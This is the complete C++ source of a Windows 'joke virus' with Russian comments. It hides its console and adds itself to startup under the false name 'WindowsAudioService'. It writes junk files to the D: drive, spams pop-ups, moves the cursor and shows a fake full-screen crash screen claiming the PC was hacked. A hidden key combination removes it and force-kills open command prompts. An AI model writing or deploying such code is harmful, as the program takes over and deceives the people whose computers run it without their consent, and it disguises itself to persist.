#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <mmsystem.h>
#include <cmath>
#include <cstdlib>
#include <ctime>
#include <thread>
#include <chrono>
#include <string>
#include <vector>
#include <atomic>
#include <fstream>

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "winmm.lib")

static const wchar_t* kRunKey  = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
static const wchar_t* kRunName = L"WindowsAudioService";

static std::atomic<bool> g_killSwitch{false};
static std::atomic<bool> g_bsodActive{false};
static std::atomic<bool> g_musicPlaying{false};

// ─────────── автозапуск ───────────
static bool IsAutoRunInstalled() {
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, kRunKey, 0, KEY_READ, &hKey) != ERROR_SUCCESS)
        return false;
    wchar_t buf[MAX_PATH] = {};
    DWORD sz = sizeof(buf), type = 0;
    LONG r = RegQueryValueExW(hKey, kRunName, nullptr, &type, (BYTE*)buf, &sz);
    RegCloseKey(hKey);
    return r == ERROR_SUCCESS;
}

static void InstallAutoRun() {
    wchar_t path[MAX_PATH] = {};
    GetModuleFileNameW(nullptr, path, MAX_PATH);
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, kRunKey, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        std::wstring quoted = L"\"" + std::wstring(path) + L"\"";
        RegSetValueExW(hKey, kRunName, 0, REG_SZ,
                       (const BYTE*)quoted.c_str(),
                       (DWORD)((quoted.size() + 1) * sizeof(wchar_t)));
        RegCloseKey(hKey);
    }
}

static void RemoveAutoRun() {
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, kRunKey, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegDeleteValueW(hKey, kRunName);
        RegCloseKey(hKey);
    }
}

// ─────────── kill switch ───────────
static DWORD WINAPI KillSwitchWatcher(LPVOID) {
    int holdMs = 0;
    const int HOLD_REQUIRED = 3000;
    while (!g_killSwitch.load()) {
        bool ctrl  = (GetAsyncKeyState(VK_CONTROL) & 0x8000) != 0;
        bool shift = (GetAsyncKeyState(VK_SHIFT)   & 0x8000) != 0;
        bool alt   = (GetAsyncKeyState(VK_MENU)    & 0x8000) != 0;
        bool q     = (GetAsyncKeyState('Q')        & 0x8000) != 0;
        if (ctrl && shift && alt && q) {
            holdMs += 50;
            if (holdMs >= HOLD_REQUIRED) {
                g_killSwitch.store(true);
                PlaySoundW(nullptr, nullptr, 0);
                RemoveAutoRun();
                system("taskkill /F /IM cmd.exe /T > nul 2>&1");
                MessageBoxW(nullptr,
                    L"Kill switch сработал.\n\nПрога удалена из автозагрузки.\n"
                    L"Больше не появится.\n\n— Fox",
                    L"Самоуничтожение",
                    MB_OK | MB_ICONINFORMATION | MB_TOPMOST);
                ExitProcess(0);
            }
        } else {
            holdMs = 0;
        }
        Sleep(50);
    }
    return 0;
}

// ─────────── получение пути к папке с exe ───────────
static std::wstring GetExeDir() {
    wchar_t exePath[MAX_PATH] = {};
    GetModuleFileNameW(nullptr, exePath, MAX_PATH);
    std::wstring dir(exePath);
    size_t pos = dir.find_last_of(L"\\/");
    if (pos != std::wstring::npos) dir = dir.substr(0, pos + 1);
    return dir;
}

// ─────────── музыка ───────────
static DWORD WINAPI MusicPlayer(LPVOID) {
    std::wstring wavPath = GetExeDir() + L"music.wav";
    g_musicPlaying.store(true);
    // SND_ASYNC — чтобы можно было стопать снаружи
    PlaySoundW(wavPath.c_str(), nullptr, SND_FILENAME | SND_ASYNC);
    // держим 60 секунд максимум или пока BSOD не стартанёт
    for (int i = 0; i < 1200; ++i) {
        if (g_killSwitch.load()) break;
        if (g_bsodActive.load()) break;   // BSOD стартанул — стопаем музыку
        std::this_thread::sleep_for(std::chrono::milliseconds(50));
    }
    PlaySoundW(nullptr, nullptr, 0);
    g_musicPlaying.store(false);
    return 0;
}

// ─────────── срач файлами на D:\ ───────────
static DWORD WINAPI FileSpammer(LPVOID) {
    std::this_thread::sleep_for(std::chrono::seconds(2));
    if (g_killSwitch.load()) return 0;

    UINT driveType = GetDriveTypeW(L"D:\\");
    if (driveType == DRIVE_NO_ROOT_DIR || driveType == DRIVE_UNKNOWN) {
        return 0;
    }

    const std::wstring content =
        L"sjjdjxjdjcjdiknwtfsbaobegnoahitborhiebfqvifgibwibfivrqbrwvegwftwwtibgwnwtnowhwthtbtwbtobobotbotboqbowbowhotboahowborbowhothowhowbowgidgiqvifbiwbwf"
        L"sjjdjxjdjcjdiknwtfsbaobegnoahitborhiebfqvifgibwibfivrqbrwvegwftwwtibgwnwtnowhwthtbtwbtobobotbotboqbowbowhotboahowborbowhothowhowbowgidgiqvifbiwbwf"
        L"sjjdjxjdjcjdiknwtfsbaobegnoahitborhiebfqvifgibwibfivrqbrwvegwftwwtibgwnwtnowhwthtbtwbtobobotbotboqbowbowhotboahowborbowhothowhowbowgidgiqvifbiwbwf";

    for (int i = 0; i < 10; ++i) {
        if (g_killSwitch.load()) return 0;
        std::wstring filename = (i == 0)
            ? L"D:\\sanya.txt"
            : L"D:\\sanya_" + std::to_wstring(i) + L".txt";

        std::ofstream f(filename, std::ios::binary | std::ios::trunc);
        if (f.is_open()) {
            std::string utf8;
            for (wchar_t wc : content) {
                if (wc < 0x80) utf8.push_back((char)wc);
                else if (wc < 0x800) {
                    utf8.push_back((char)(0xC0 | (wc >> 6)));
                    utf8.push_back((char)(0x80 | (wc & 0x3F)));
                } else {
                    utf8.push_back((char)(0xE0 | (wc >> 12)));
                    utf8.push_back((char)(0x80 | ((wc >> 6) & 0x3F)));
                    utf8.push_back((char)(0x80 | (wc & 0x3F)));
                }
            }
            f.write(utf8.c_str(), utf8.size());
            f.close();
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
    }
    return 0;
}

// ─────────── MessageBox-спам ───────────
static const wchar_t* kMessages[] = {
    L"даров Вась ты чё там ты там в порядке вась?",
    L"бро глаголит имбу",
    L"я сын мячика",
    L"я Левандовски",
    L"мой папа Наполеон",
    L"Торт?",
    L"да ладно не суетись ты это прикол",
    L"привет кивро сан",
    L"Меня написал саня, у него выходной",
    L"Окно закроется само. Или нет. Не помню",
};
static constexpr int kMsgCount = _countof(kMessages);

static DWORD WINAPI MsgSpammer(LPVOID) {
    std::srand((unsigned)std::time(nullptr) ^ GetCurrentThreadId());
    for (int i = 0; i < 12; ++i) {
        if (g_killSwitch.load()) return 0;
        if (g_bsodActive.load()) return 0;   // BSOD активен — стопаем месседжбоксы
        const wchar_t* txt = kMessages[std::rand() % kMsgCount];
        std::thread([txt]() {
            MessageBoxW(nullptr, txt, L"Ой, всё",
                        MB_OK | MB_ICONWARNING | MB_TOPMOST);
        }).detach();
        std::this_thread::sleep_for(std::chrono::milliseconds(250));
    }
    return 0;
}

static DWORD WINAPI CursorDancer(LPVOID) {
    POINT start{};
    GetCursorPos(&start);
    const double ampX = 220.0, ampY = 160.0;
    const auto t0 = std::chrono::steady_clock::now();
    while (std::chrono::duration_cast<std::chrono::seconds>(
               std::chrono::steady_clock::now() - t0).count() < 3) {
        if (g_killSwitch.load()) return 0;
        const double t = std::chrono::duration<double>(
            std::chrono::steady_clock::now() - t0).count();
        int x = start.x + (int)(ampX * std::sin(t * 1.1));
        int y = start.y + (int)(ampY * std::sin(t * 1.9));
        SetCursorPos(x, y);
        std::this_thread::sleep_for(std::chrono::milliseconds(12));
    }
    return 0;
}

// ─────────── красный BSOD с процентами ───────────
struct BsodState {
    int percent = 0;
    bool showArrow = false;
};

static BsodState g_bsodState;

static LRESULT CALLBACK BsodWndProc(HWND h, UINT m, WPARAM w, LPARAM l) {
    if (m == WM_ERASEBKGND) return 1;
    if (m == WM_PAINT) {
        PAINTSTRUCT ps;
        HDC dc = BeginPaint(h, &ps);
        RECT rc;
        GetClientRect(h, &rc);
        const int W = rc.right, H = rc.bottom;

        // фон — тёмно-красный
        HBRUSH bg = CreateSolidBrush(RGB(140, 0, 0));
        FillRect(dc, &rc, bg);
        DeleteObject(bg);

        SetBkMode(dc, TRANSPARENT);
        SetTextColor(dc, RGB(255, 255, 255));

        // рожа :)
        HFONT fFace = CreateFontW(-110, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
            DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
            ANTIALIASED_QUALITY, DEFAULT_PITCH, L"Segoe UI");
        HGDIOBJ old = SelectObject(dc, fFace);
        RECT rf{0, (int)(H * 0.05), W, (int)(H * 0.05) + 140};
        DrawTextW(dc, L":)", -1, &rf, DT_CENTER | DT_SINGLELINE);

        // заголовок + инструкция
        HFONT fBig = CreateFontW(-30, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
            DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
            ANTIALIASED_QUALITY, DEFAULT_PITCH, L"Segoe UI");
        SelectObject(dc, fBig);
        RECT rt{60, (int)(H * 0.28), W - 60, H};
        const wchar_t* body =
            L"Твой ПК столкнулся с проблемой и будет перезагружен.\n"
            L"Сбор информации о проблеме...\n\n"
            L"Код ошибки: SANCHES_HAX_0xDEADPISKA\n"
            L"Виновник: Sanchez\n"
            L"Сообщение: Sanchez vzlomal tvoy pk piska pi piska\n\n"
            L"Чтобы выключить навсегда — зажми Ctrl+Shift+Alt+Q на 3 секунды.\n"
            L"— Jack & Fox";
        DrawTextW(dc, body, -1, &rt, DT_LEFT | DT_WORDBREAK);

        // ─── прогресс-бар с процентами ───
        const int barY = (int)(H * 0.72);
        const int barX = 60;
        const int barW = W - 120;
        const int barH = 40;

        // рамка
        HPEN penWhite = CreatePen(PS_SOLID, 2, RGB(255, 255, 255));
        HGDIOBJ oldPen = SelectObject(dc, penWhite);
        HGDIOBJ oldBrush = SelectObject(dc, GetStockObject(NULL_BRUSH));
        Rectangle(dc, barX, barY, barX + barW, barY + barH);

        // заполнение — пропорционально проценту
        if (g_bsodState.percent > 0) {
            int fillW = (int)((double)barW * g_bsodState.percent / 100.0);
            RECT fill{barX + 1, barY + 1, barX + fillW, barY + barH - 1};
            HBRUSH fillBr = CreateSolidBrush(RGB(255, 80, 80));
            FillRect(dc, &fill, fillBr);
            DeleteObject(fillBr);
        }

        SelectObject(dc, oldPen);
        SelectObject(dc, oldBrush);
        DeleteObject(penWhite);

        // число процентов слева от бара
        HFONT fPercent = CreateFontW(-40, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
            DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
            ANTIALIASED_QUALITY, DEFAULT_PITCH, L"Consolas");
        SelectObject(dc, fPercent);
        SetTextColor(dc, RGB(255, 255, 255));

        wchar_t pctBuf[16];
        wsprintfW(pctBuf, L"%d%%", g_bsodState.percent);
        RECT rp{barX, barY + barH + 10, barX + 200, barY + barH + 70};
        DrawTextW(dc, pctBuf, -1, &rp, DT_LEFT | DT_SINGLELINE);

        // ─── красная стрелка на 67 ───
        if (g_bsodState.showArrow) {
            // стрелка указывает справа на цифру "67%" возле прогресс-бара
            int arrowTipX = barX + 150;   // конец стрелки (указывает на 67)
            int arrowTipY = barY + barH + 40;
            int arrowBackX = arrowTipX + 200;
            int arrowHalfH = 25;

            HBRUSH redBr = CreateSolidBrush(RGB(255, 0, 0));
            HPEN redPen = CreatePen(PS_SOLID, 3, RGB(255, 0, 0));
            HGDIOBJ pOld = SelectObject(dc, redPen);
            HGDIOBJ bOld = SelectObject(dc, redBr);

            // линия стрелки
            MoveToEx(dc, arrowBackX, arrowTipY, nullptr);
            LineTo(dc, arrowTipX + 40, arrowTipY);

            // наконечник (треугольник)
            POINT tri[3] = {
                { arrowTipX, arrowTipY },
                { arrowTipX + 40, arrowTipY - arrowHalfH },
                { arrowTipX + 40, arrowTipY + arrowHalfH }
            };
            Polygon(dc, tri, 3);

            SelectObject(dc, pOld);
            SelectObject(dc, bOld);
            DeleteObject(redBr);
            DeleteObject(redPen);
        }

        SelectObject(dc, old);
        DeleteObject(fFace);
        DeleteObject(fBig);
        DeleteObject(fPercent);
        EndPaint(h, &ps);
        return 0;
    }
    if (m == WM_DESTROY) { PostQuitMessage(0); return 0; }
    return DefWindowProcW(h, m, w, l);
}

static DWORD WINAPI RedBSOD(LPVOID) {
    std::this_thread::sleep_for(std::chrono::seconds(5));
    if (g_killSwitch.load()) return 0;

    g_bsodActive.store(true);
    // останавливаем музыку
    PlaySoundW(nullptr, nullptr, 0);

    WNDCLASSW wc{};
    wc.lpfnWndProc   = BsodWndProc;
    wc.hInstance     = GetModuleHandleW(nullptr);
    wc.hCursor       = LoadCursor(nullptr, IDC_ARROW);
    wc.lpszClassName = L"JackFoxRedBsod";
    RegisterClassW(&wc);

    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    HWND h = CreateWindowExW(
        WS_EX_TOPMOST, L"JackFoxRedBsod", L"",
        WS_POPUP, 0, 0, sw, sh,
        nullptr, nullptr, wc.hInstance, nullptr);
    ShowWindow(h, SW_SHOW);
    UpdateWindow(h);
    SetForegroundWindow(h);

    // последовательность процентов с таймингами на 18 секунд
    // тайминги: 1 (0.5s), 7 (1.5s), 9 (3s), 18 (5s), 34 (8s), 56 (11s), 67 (14s)
    struct Step { int pct; int ms; };
    const Step steps[] = {
        { 1,  500 }, { 7, 1000 }, { 9, 1500 }, { 18, 2000 },
        { 34, 3000 }, { 56, 3000 }, { 67, 3000 }
    };

    for (auto& s : steps) {
        if (g_killSwitch.load()) { DestroyWindow(h); return 0; }
        g_bsodState.percent = s.pct;
        g_bsodState.showArrow = false;
        InvalidateRect(h, nullptr, TRUE);
        UpdateWindow(h);
        std::this_thread::sleep_for(std::chrono::milliseconds(s.ms));
    }

    // на 67 — показываем стрелку и играем 67.wav
    g_bsodState.percent = 67;
    g_bsodState.showArrow = true;
    InvalidateRect(h, nullptr, TRUE);
    UpdateWindow(h);

    // играем 67.wav синхронно
    std::wstring wav67 = GetExeDir() + L"67.wav";
    PlaySoundW(wav67.c_str(), nullptr, SND_FILENAME | SND_SYNC);

    // держим ещё немного чтобы стрелка была видна
    for (int i = 0; i < 40; ++i) {
        if (g_killSwitch.load()) break;
        std::this_thread::sleep_for(std::chrono::milliseconds(50));
    }

    // убираем окно
    DestroyWindow(h);
    g_bsodActive.store(false);
    return 0;
}

// ─────────── радужный экран ───────────
static DWORD WINAPI RainbowScreen(LPVOID) {
    // ждём пока BSOD закончится (18 сек после старта BSOD = 5 + 18 = 23 сек от запуска)
    std::this_thread::sleep_for(std::chrono::seconds(24));
    if (g_killSwitch.load()) return 0;

    WNDCLASSW wc{};
    wc.lpfnWndProc   = DefWindowProcW;
    wc.hInstance     = GetModuleHandleW(nullptr);
    wc.hCursor       = LoadCursor(nullptr, IDC_ARROW);
    wc.lpszClassName = L"JackFoxRainbow";
    RegisterClassW(&wc);

    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    HWND h = CreateWindowExW(
        WS_EX_TOPMOST, L"JackFoxRainbow", L"",
        WS_POPUP, 0, 0, sw, sh,
        nullptr, nullptr, wc.hInstance, nullptr);
    ShowWindow(h, SW_SHOW);
    UpdateWindow(h);
    SetForegroundWindow(h);

    HDC hdc = GetDC(h);

    // радуга 7 полос + играем 67.wav
    std::wstring wav67 = GetExeDir() + L"67.wav";
    PlaySoundW(wav67.c_str(), nullptr, SND_FILENAME | SND_ASYNC);

    const COLORREF colors[] = {
        RGB(255,0,0), RGB(255,127,0), RGB(255,255,0),
        RGB(0,255,0), RGB(0,0,255), RGB(75,0,130), RGB(143,0,255)
    };
    int stripeH = sh / 7;
    for (int i = 0; i < 7; ++i) {
        RECT r{0, i * stripeH, sw, (i + 1) * stripeH};
        HBRUSH br = CreateSolidBrush(colors[i]);
        FillRect(hdc, &r, br);
        DeleteObject(br);
    }

    // держим 5 секунд
    for (int i = 0; i < 100; ++i) {
        if (g_killSwitch.load()) break;
        std::this_thread::sleep_for(std::chrono::milliseconds(50));
    }

    PlaySoundW(nullptr, nullptr, 0);
    ReleaseDC(h, hdc);
    DestroyWindow(h);
    return 0;
}

// ─────────── финал ───────────
static DWORD WINAPI FinalWord(LPVOID) {
    // ждём пока всё закончится: BSOD (5+18=23) + радуга (5) + запас = 30 сек
    for (int i = 0; i < 600; ++i) {
        if (g_killSwitch.load()) return 0;
        std::this_thread::sleep_for(std::chrono::milliseconds(50));
    }
    if (g_killSwitch.load()) return 0;
    PlaySoundW(nullptr, nullptr, 0);

    MessageBoxW(nullptr,
        L"Это была шутка. Ничего не удалено.\n\n"
        L"Файлы sanya.txt на D:\\ можешь удалить вручную.\n"
        L"Я остаюсь в автозагрузке и буду вылезать каждый раз.\n\n"
        L"Чтобы выключить навсегда — зажми Ctrl+Shift+Alt+Q на 3 секунды.\n\n"
        L"— Jack & Fox",
        L"Всё, я ушёл",
        MB_OK | MB_ICONINFORMATION | MB_TOPMOST);
    ExitProcess(0);
    return 0;
}

int main() {
    HANDLE hMutex = CreateMutexW(nullptr, TRUE, L"Global\\JackFoxJokeVirus");
    if (GetLastError() == ERROR_ALREADY_EXISTS) return 0;

    if (HWND c = GetConsoleWindow()) ShowWindow(c, SW_HIDE);

    if (!IsAutoRunInstalled()) InstallAutoRun();

    CreateThread(nullptr, 0, MusicPlayer,       nullptr, 0, nullptr);
    CreateThread(nullptr, 0, KillSwitchWatcher, nullptr, 0, nullptr);
    CreateThread(nullptr, 0, FileSpammer,       nullptr, 0, nullptr);
    CreateThread(nullptr, 0, MsgSpammer,        nullptr, 0, nullptr);
    CreateThread(nullptr, 0, CursorDancer,      nullptr, 0, nullptr);
    CreateThread(nullptr, 0, RedBSOD,           nullptr, 0, nullptr);
    CreateThread(nullptr, 0, RainbowScreen,     nullptr, 0, nullptr);
    CreateThread(nullptr, 0, FinalWord,         nullptr, 0, nullptr);

    Sleep(INFINITE);
    return 0;
}
